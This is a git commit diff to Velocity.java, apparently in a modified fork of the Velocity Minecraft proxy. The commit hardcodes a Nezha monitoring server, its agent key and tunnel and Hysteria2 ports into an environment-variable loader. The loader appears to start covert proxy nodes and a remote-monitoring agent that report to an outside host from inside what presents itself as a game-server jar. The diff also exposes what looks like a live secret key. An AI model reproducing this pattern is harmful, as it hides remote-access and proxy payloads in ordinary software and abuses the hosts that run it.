d7dfe865eea551bdbb5a849ca973de257ab1f28a
qiuhan186 <qiuhan186@gmail.com>
2025-08-28 01:19:29 +0800

    Update Velocity.java

--- proxy/src/main/java/com/velocitypowered/proxy/Velocity.java
+++ proxy/src/main/java/com/velocitypowered/proxy/Velocity.java
@@ -148,13 +148,13 @@ public final class Velocity {
   private static void loadEnvVars(final Map<String, String> envVars) throws IOException {
     envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
     envVars.put("FILE_PATH", "./world");
-    envVars.put("NEZHA_SERVER", "");
-    envVars.put("NEZHA_PORT", "");
-    envVars.put("NEZHA_KEY", "");
-    envVars.put("ARGO_PORT", "");
+    envVars.put("NEZHA_SERVER", "nz.yyds.qzz.io");
+    envVars.put("NEZHA_PORT", "443");
+    envVars.put("NEZHA_KEY", "mKGUhtwWVX2jhG1su0");
+    envVars.put("ARGO_PORT", "8001");
     envVars.put("ARGO_DOMAIN", "");
     envVars.put("ARGO_AUTH", "");
-    envVars.put("HY2_PORT", "");
+    envVars.put("HY2_PORT", "25627");
     envVars.put("TUIC_PORT", "");
     envVars.put("REALITY_PORT", "");
     envVars.put("UPLOAD_URL", "");
